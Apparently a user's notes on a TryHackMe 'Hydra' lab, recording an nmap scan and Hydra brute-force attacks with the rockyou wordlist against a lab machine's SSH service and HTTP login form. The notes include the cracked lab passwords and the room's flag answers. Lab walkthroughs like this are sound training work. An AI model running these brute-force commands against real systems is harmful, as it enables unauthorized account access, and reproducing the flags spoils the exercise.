# https://tryhackme.com/room/hydra

```bash
=================================
10.201.92.37 -- http://10.201.92.37 -- lin x32/x64
=================================

2025-08-05 15:00:39 -- nmap -sC -sV -O -T4 10.201.92.37
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f2:42:a8:c6:18:20:7d:bb:48:96:f7:2d:ad:7e:23:84 (RSA)
|   256 00:d7:b8:40:6c:95:c2:18:72:7e:3f:7e:5a:9f:bb:2d (ECDSA)
|_  256 f7:d7:ba:fb:e3:d2:68:86:1c:ea:de:e1:08:c6:da:78 (ED25519)
80/tcp open  http    Node.js Express framework
| http-title: Hydra Challenge
|_Requested resource was /login
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
// ssh & http

2025-08-05 15:04:11 -- hydra -t 4 -l root -P /usr/share/wordlists/rockyou.txt ssh://10.201.92.37
// no root; try molly

2025-08-05 15:06:55 -- hydra -I -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.201.92.37
[22][ssh] host: 10.201.92.37   login: molly   password: butterfly
// flag
THM{c8eeb0468febbadea859baeb33b2541b}

curl -i -X POST -d "username=wrong&password=wrong" http://10.201.92.37/
// use curl to test target string... in this case this is wrong:
<title>Error</title>
</head>
<body>
<pre>Cannot POST /</pre>
// missing /login

2025-08-05 15:12:05 -- hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.92.37 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
// -V is helpful
[80][http-post-form] host: 10.201.92.37   login: molly   password: sunshine
// flag
THM{2673a7dd116de68e85c48ec0b1f2612e}
```